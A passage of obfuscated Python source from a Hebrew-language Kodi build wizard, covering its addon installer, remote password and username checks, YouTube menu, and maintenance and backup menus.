				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2509
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2510
		else :#line:2511
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2512
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2513
			addFile ('%s'%OO00000O0O0O00OOO ,'',themeit =THEME3 )#line:2514
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2515
	setView ('files','viewType')#line:2516
def addonInstaller (OOOO000O0OO0O0O0O ,OOOOO0O0O000OO0O0 ):#line:2518
	if not ADDONFILE =='http://':#line:2519
		OOOOO0OOO0O0O000O =wiz .workingURL (OOOOO0O0O000OO0O0 )#line:2520
		if OOOOO0OOO0O0O000O ==True :#line:2521
			O0000O00000O0OOOO =wiz .openURL (OOOOO0O0O000OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2522
			O0O0O00OOO00O0O0O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOO000O0OO0O0O0O ).findall (O0000O00000O0OOOO )#line:2523
			if len (O0O0O00OOO00O0O0O )>0 :#line:2524
				for O00OO0000000OOO00 ,OOOOO0O0O000OO0O0 ,O00OOO00OOOOO00OO ,OO0O0OO0O00O0OO00 ,O0O0O0OOO0O00OOOO ,OO0O0O0O0000O0OO0 ,OO0OO00000O00OO00 ,OOO000OO0O00O0OO0 ,O00O0O0O000O0000O in O0O0O00OOO00O0O0O :#line:2525
					if os .path .exists (os .path .join (ADDONS ,OOOO000O0OO0O0O0O )):#line:2526
						OO0000O00OOOOO0O0 =['Launch Addon','Remove Addon']#line:2527
						OO00OOO0000O0O0OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0000O00OOOOO0O0 )#line:2528
						if OO00OOO0000O0O0OO ==0 :#line:2529
							wiz .ebi ('RunAddon(%s)'%OOOO000O0OO0O0O0O )#line:2530
							xbmc .sleep (1000 )#line:2531
							return True #line:2532
						elif OO00OOO0000O0O0OO ==1 :#line:2533
							wiz .cleanHouse (os .path .join (ADDONS ,OOOO000O0OO0O0O0O ))#line:2534
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOO000O0OO0O0O0O ))#line:2535
							except :pass #line:2536
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO000O0OO0O0O0O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2537
								removeAddonData (OOOO000O0OO0O0O0O )#line:2538
							wiz .refresh ()#line:2539
							return True #line:2540
						else :#line:2541
							return False #line:2542
					OOOOO000OO0O0OO0O =os .path .join (ADDONS ,O00OOO00OOOOO00OO )#line:2543
					if not O00OOO00OOOOO00OO .lower ()=='none'and not os .path .exists (OOOOO000OO0O0OO0O ):#line:2544
						wiz .log ("Repository not installed, installing it")#line:2545
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOO000O0OO0O0O0O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OOO00OOOOO00OO ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2546
							OO000OOOOO0000O0O =wiz .parseDOM (wiz .openURL (OO0O0OO0O00O0OO00 ),'addon',ret ='version',attrs ={'id':O00OOO00OOOOO00OO })#line:2547
							if len (OO000OOOOO0000O0O )>0 :#line:2548
								O00000OOOOO00OO00 ='%s%s-%s.zip'%(O0O0O0OOO0O00OOOO ,O00OOO00OOOOO00OO ,OO000OOOOO0000O0O [0 ])#line:2549
								wiz .log (O00000OOOOO00OO00 )#line:2550
								if KODIV >=17 :wiz .addonDatabase (O00OOO00OOOOO00OO ,1 )#line:2551
								installAddon (O00OOO00OOOOO00OO ,O00000OOOOO00OO00 )#line:2552
								wiz .ebi ('UpdateAddonRepos()')#line:2553
								wiz .log ("Installing Addon from Kodi")#line:2555
								OOOO00O00000O00O0 =installFromKodi (OOOO000O0OO0O0O0O )#line:2556
								wiz .log ("Install from Kodi: %s"%OOOO00O00000O00O0 )#line:2557
								if OOOO00O00000O00O0 :#line:2558
									wiz .refresh ()#line:2559
									return True #line:2560
							else :#line:2561
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00OOO00OOOOO00OO )#line:2562
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOO000O0OO0O0O0O ,O00OOO00OOOOO00OO ))#line:2563
					elif O00OOO00OOOOO00OO .lower ()=='none':#line:2564
						wiz .log ("No repository, installing addon")#line:2565
						OO0000O0OOOOO0OOO =OOOO000O0OO0O0O0O #line:2566
						OO0000000OO0OOO0O =OOOOO0O0O000OO0O0 #line:2567
						installAddon (OOOO000O0OO0O0O0O ,OOOOO0O0O000OO0O0 )#line:2568
						wiz .refresh ()#line:2569
						return True #line:2570
					else :#line:2571
						wiz .log ("Repository installed, installing addon")#line:2572
						OOOO00O00000O00O0 =installFromKodi (OOOO000O0OO0O0O0O ,False )#line:2573
						if OOOO00O00000O00O0 :#line:2574
							wiz .refresh ()#line:2575
							return True #line:2576
					if os .path .exists (os .path .join (ADDONS ,OOOO000O0OO0O0O0O )):return True #line:2577
					O0O0OOO0O0000OO00 =wiz .parseDOM (wiz .openURL (OO0O0OO0O00O0OO00 ),'addon',ret ='version',attrs ={'id':OOOO000O0OO0O0O0O })#line:2578
					if len (O0O0OOO0O0000OO00 )>0 :#line:2579
						OOOOO0O0O000OO0O0 ="%s%s-%s.zip"%(OOOOO0O0O000OO0O0 ,OOOO000O0OO0O0O0O ,O0O0OOO0O0000OO00 [0 ])#line:2580
						wiz .log (str (OOOOO0O0O000OO0O0 ))#line:2581
						if KODIV >=17 :wiz .addonDatabase (OOOO000O0OO0O0O0O ,1 )#line:2582
						installAddon (OOOO000O0OO0O0O0O ,OOOOO0O0O000OO0O0 )#line:2583
						wiz .refresh ()#line:2584
					else :#line:2585
						wiz .log ("no match");return False #line:2586
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2587
		else :wiz .log ("[Addon Installer] Text File: %s"%OOOOO0OOO0O0O000O )#line:2588
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2589
def installFromKodi (OOO00O00O000000OO ,over =True ):#line:2591
	if over ==True :#line:2592
		xbmc .sleep (2000 )#line:2593
	wiz .ebi ('RunPlugin(plugin://%s)'%OOO00O00O000000OO )#line:2595
	if not wiz .whileWindow ('yesnodialog'):#line:2596
		return False #line:2597
	xbmc .sleep (1000 )#line:2598
	if wiz .whileWindow ('okdialog'):#line:2599
		return False #line:2600
	wiz .whileWindow ('progressdialog')#line:2601
	if os .path .exists (os .path .join (ADDONS ,OOO00O00O000000OO )):return True #line:2602
	else :return False #line:2603
def installAddon (OO00O0O000O0O0OOO ,OOOOOO00OOO0O00OO ):#line:2605
	if not wiz .workingURL (OOOOOO00OOO0O00OO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO00O0O000O0O0OOO ,COLOR2 ));return #line:2606
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2607
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O0O000O0O0OOO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2608
	O000OO00O0OO00OO0 =OOOOOO00OOO0O00OO .split ('/')#line:2609
	OO0000OO00OO0O0O0 =os .path .join (PACKAGES ,O000OO00O0OO00OO0 [-1 ])#line:2610
	try :os .remove (OO0000OO00OO0O0O0 )#line:2611
	except :pass #line:2612
	downloader .download (OOOOOO00OOO0O00OO ,OO0000OO00OO0O0O0 ,DP )#line:2613
	O0O0O00OO0O0O000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O0O000O0O0OOO )#line:2614
	DP .update (0 ,O0O0O00OO0O0O000O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2615
	O000O0O0000O0O0O0 ,OOOOOO0OOO00OO0O0 ,O0O0O0OO0O0O0OO0O =extract .all (OO0000OO00OO0O0O0 ,ADDONS ,DP ,title =O0O0O00OO0O0O000O )#line:2616
	DP .update (0 ,O0O0O00OO0O0O000O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2617
	installed (OO00O0O000O0O0OOO )#line:2618
	installDep (OO00O0O000O0O0OOO ,DP )#line:2619
	DP .close ()#line:2620
	wiz .ebi ('UpdateAddonRepos()')#line:2621
	wiz .ebi ('UpdateLocalAddons()')#line:2622
	wiz .refresh ()#line:2623
def installDep (O0OO00000O0O0000O ,DP =None ):#line:2625
	O0O000OO000OOO000 =os .path .join (ADDONS ,O0OO00000O0O0000O ,'addon.xml')#line:2626
	if os .path .exists (O0O000OO000OOO000 ):#line:2627
		OO00OO0O0O0OOOOO0 =open (O0O000OO000OOO000 ,mode ='r');OOO0OOO000O00O00O =OO00OO0O0O0OOOOO0 .read ();OO00OO0O0O0OOOOO0 .close ();#line:2628
		OOO0O0OOO0OOO00O0 =wiz .parseDOM (OOO0OOO000O00O00O ,'import',ret ='addon')#line:2629
		for OO00OO00O00OOO000 in OOO0O0OOO0OOO00O0 :#line:2630
			if not 'xbmc.python'in OO00OO00O00OOO000 :#line:2631
				if not DP ==None :#line:2632
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OO00O00OOO000 ))#line:2633
				wiz .createTemp (OO00OO00O00OOO000 )#line:2634
def installed (O00O000OO0O0000OO ):#line:2661
	O00O0OO0O0OO0OOOO =os .path .join (ADDONS ,O00O000OO0O0000OO ,'addon.xml')#line:2662
	if os .path .exists (O00O0OO0O0OO0OOOO ):#line:2663
		try :#line:2664
			OO0000000000O0000 =open (O00O0OO0O0OO0OOOO ,mode ='r');OOOO0000OOOO00O00 =OO0000000000O0000 .read ();OO0000000000O0000 .close ()#line:2665
			OOO0O0O00OOOOOOOO =wiz .parseDOM (OOOO0000OOOO00O00 ,'addon',ret ='name',attrs ={'id':O00O000OO0O0000OO })#line:2666
			OO00O0OOO0OO0OO0O =os .path .join (ADDONS ,O00O000OO0O0000OO ,'icon.png')#line:2667
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O0O00OOOOOOOO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO00O0OOO0OO0OO0O )#line:2668
		except :pass #line:2669
def youtubeMenu (url =None ):#line:2671
	if not YOUTUBEFILE =='http://':#line:2672
		if url ==None :#line:2673
			OO00OO0OOOO0OO0O0 =wiz .workingURL (YOUTUBEFILE )#line:2674
			O000000OO0000OOOO =uservar .YOUTUBEFILE #line:2675
		else :#line:2676
			OO00OO0OOOO0OO0O0 =wiz .workingURL (url )#line:2677
			O000000OO0000OOOO =url #line:2678
		if OO00OO0OOOO0OO0O0 ==True :#line:2679
			O0O00O0O0OOOOO0OO =wiz .openURL (O000000OO0000OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2680
			O00000OO00OO0OO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O00O0O0OOOOO0OO )#line:2681
			if len (O00000OO00OO0OO0O )>0 :#line:2682
				for OO00OOOOOOOO0O000 ,OO0O0O0O00000O0OO ,url ,O000OO00O00O00000 ,O0OO00O00OOO00000 ,OO000OO0OO00OOO00 in O00000OO00OO0OO0O :#line:2683
					if OO0O0O0O00000O0OO .lower ()=="yes":#line:2684
						addDir ("[B]%s[/B]"%OO00OOOOOOOO0O000 ,'youtube',url ,description =OO000OO0OO00OOO00 ,icon =O000OO00O00O00000 ,fanart =O0OO00O00OOO00000 ,themeit =THEME3 )#line:2685
					else :#line:2686
						addFile (OO00OOOOOOOO0O000 ,'viewVideo',url =url ,description =OO000OO0OO00OOO00 ,icon =O000OO00O00O00000 ,fanart =O0OO00O00OOO00000 ,themeit =THEME2 )#line:2687
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2688
		else :#line:2689
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2690
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2691
			addFile ('%s'%OO00OO0OOOO0OO0O0 ,'',themeit =THEME3 )#line:2692
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2693
	setView ('files','viewType')#line:2694
def STARTP ():#line:2695
	O00O000O000OOO00O =(ADDON .getSetting ("pass"))#line:2696
	if BUILDNAME =="":#line:2697
	 if not NOTIFY =='true':#line:2698
          OOOO00OOOOO00O0OO =wiz .workingURL (NOTIFICATION )#line:2699
	 if not NOTIFY2 =='true':#line:2700
          OOOO00OOOOO00O0OO =wiz .workingURL (NOTIFICATION2 )#line:2701
	 if not NOTIFY3 =='true':#line:2702
          OOOO00OOOOO00O0OO =wiz .workingURL (NOTIFICATION3 )#line:2703
	OO0O000OO00OO0O0O =O00O000O000OOO00O #line:2704
	OOOO00OOOOO00O0OO =urllib2 .Request (SPEED )#line:2705
	OO00O0OOO00OO0OOO =urllib2 .urlopen (OOOO00OOOOO00O0OO )#line:2706
	OO0O0OOOO0O0O0O00 =OO00O0OOO00OO0OOO .readlines ()#line:2708
	O0OO000O0OO00O00O =0 #line:2712
	for O0OO0O0000O0O0OO0 in OO0O0OOOO0O0O0O00 :#line:2713
		if O0OO0O0000O0O0OO0 .split (' ==')[0 ]==O00O000O000OOO00O or O0OO0O0000O0O0OO0 .split ()[0 ]==O00O000O000OOO00O :#line:2714
			O0OO000O0OO00O00O =1 #line:2715
			break #line:2716
	if O0OO000O0OO00O00O ==0 :#line:2717
					O0OO0OOO0O0O0000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2718
					if O0OO0OOO0O0O0000O :#line:2720
						ADDON .openSettings ()#line:2722
						sys .exit ()#line:2724
					else :#line:2725
						sys .exit ()#line:2726
	return 'ok'#line:2730
def STARTP2 ():#line:2731
	OOO00OO000000OO00 =(ADDON .getSetting ("user"))#line:2732
	OOO00000OOOOOO000 =(UNAME )#line:2734
	OO0O000OO0O0O0O0O =urllib2 .urlopen (OOO00000OOOOOO000 )#line:2735
	OOOO000O00O0O0OO0 =OO0O000OO0O0O0O0O .readlines ()#line:2736
	OO0OOOOOOOOO0000O =0 #line:2737
	for OO0O00O0O0O00000O in OOOO000O00O0O0OO0 :#line:2740
		if OO0O00O0O0O00000O .split (' ==')[0 ]==OOO00OO000000OO00 or OO0O00O0O0O00000O .split ()[0 ]==OOO00OO000000OO00 :#line:2741
			OO0OOOOOOOOO0000O =1 #line:2742
			break #line:2743
	if OO0OOOOOOOOO0000O ==0 :#line:2744
		O0O0000OO0000O0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2745
		if O0O0000OO0000O0O0 :#line:2747
			ADDON .openSettings ()#line:2749
			sys .exit ()#line:2752
		else :#line:2753
			sys .exit ()#line:2754
	return 'ok'#line:2758
def passandpin ():#line:2759
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2760
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2761
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2762
def passandUsername ():#line:2763
	ADDON .openSettings ()#line:2764
def folderback ():#line:2767
    O00O0OOO0OOO00O00 =ADDON .getSetting ("path")#line:2768
    if O00O0OOO0OOO00O00 :#line:2769
      O00O0OOO0OOO00O00 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2770
      ADDON .setSetting ("path",O00O0OOO0OOO00O00 )#line:2771
def backmyupbuild ():#line:2774
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2778
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2786
def maintMenu (view =None ):#line:2790
	O00OO00000O0OO00O ='[B][COLOR green]ON[/COLOR][/B]';O000O000OO000O000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2792
	O0OOO00OO0OOOOO0O ='true'if AUTOCLEANUP =='true'else 'false'#line:2793
	OOOOO0OO0O00O00O0 ='true'if AUTOCACHE =='true'else 'false'#line:2794
	OO00OOOO0OO00OOOO ='true'if AUTOPACKAGES =='true'else 'false'#line:2795
	O00OO0O00O00O000O ='true'if AUTOTHUMBS =='true'else 'false'#line:2796
	OOO000OO0O00OO00O ='true'if SHOWMAINT =='true'else 'false'#line:2797
	OO0OOOOO0O00O000O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2798
	O000OO00O0OOOO000 ='true'if INCLUDEALL =='true'else 'false'#line:2799
	O00OO0O0O00OO0OOO ='true'if THIRDPARTY =='true'else 'false'#line:2800
	if wiz .Grab_Log (True )==False :O00OOOOOO00000OO0 =0 #line:2801
	else :O00OOOOOO00000OO0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2802
	if wiz .Grab_Log (True ,True )==False :O00O000OO00OOOO0O =0 #line:2803
	else :O00O000OO00OOOO0O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2804
	O0O0OOOO00OOO0O00 =int (O00OOOOOO00000OO0 )+int (O00O000OO00OOOO0O )#line:2805
	O00O00OO00000OO0O =str (O0O0OOOO00OOO0O00 )+' Error(s) Found'if O0O0OOOO00OOO0O00 >0 else 'None Found'#line:2806
	O000000000OO0O0OO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2807
	if O000OO00O0OOOO000 =='true':#line:2808
		OOO0O0OO0O0000000 ='true'#line:2809
		OOO0OO00OOOOO0OO0 ='true'#line:2810
		OOO00O000000OOOOO ='true'#line:2811
		O0OOOO00O00O00OOO ='true'#line:2812
		OO00000O0OOO000O0 ='true'#line:2813
		O00000000OOOO0O00 ='true'#line:2814
		O00OOO0OO0OOO0OO0 ='true'#line:2815
		OO0O00O0OO00OO00O ='true'#line:2816
	else :#line:2817
		OOO0O0OO0O0000000 ='true'if INCLUDEBOB =='true'else 'false'#line:2818
		OOO0OO00OOOOO0OO0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2819
		OOO00O000000OOOOO ='true'if INCLUDESPECTO =='true'else 'false'#line:2820
		O0OOOO00O00O00OOO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2821
		OO00000O0OOO000O0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2822
		O00000000OOOO0O00 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2823
		O00OOO0OO0OOO0OO0 ='true'if INCLUDESALTS =='true'else 'false'#line:2824
		OO0O00O0OO00OO00O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2825
	OO0000O0O0OOO00OO =wiz .getSize (PACKAGES )#line:2826
	O0O0OOO00OO0000OO =wiz .getSize (THUMBS )#line:2827
	O0OO000O00O00OOOO =wiz .getCacheSize ()#line:2828
	O0OOO0OO0000O0O0O =OO0000O0O0OOO00OO +O0O0OOO00OO0000OO +O0OO000O00O00OOOO #line:2829
	OO0OOO0OOOOOOOO0O =['Daily','Always','3 Days','Weekly']#line:2830
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2831
	if view =="clean"or SHOWMAINT =='true':#line:2832
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO0OO0000O0O0O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO000O00O00OOOO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0000O0O0OOO00OO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0OOO00OO0000OO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2840
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2841
	if view =="addon"or SHOWMAINT =='false':#line:2842
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2849
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2850
	if view =="misc"or SHOWMAINT =='true':#line:2851
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('View Errors in Log: %s'%(O00O00OO00000OO0O ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Clear Wizard Log File%s'%O000000000OO0O0OO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2861
	if view =="backup"or SHOWMAINT =='true':#line:2862
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2875
	if view =="tweaks"or SHOWMAINT =='true':#line:2876
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2877
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		else :#line:2879
			if os .path .exists (ADVANCED ):#line:2880
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2881
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2882
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2889
	addFile ('Show All Maintenance: %s'%OOO000OO0O00OO00O .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2890
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2891
	addFile ('Third Party Wizards: %s'%O00OO0O0O00OO0OOO .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2892
	if O00OO0O0O00OO0OOO =='true':#line:2893
		OOO000000O0OO0OOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2894
		OOOOO0OOOO0000000 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2895
		O0000O0OO00O00O00 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2896
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO000000O0OO0OOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2897
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO0OOOO0000000 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0000O0OO00O00O00 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2899
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2900
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0OOO00OO0OOOOO0O .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2901
	if O0OOO00OO0OOOOO0O =='true':#line:2902
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO0OOO0OOOOOOOO0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2903
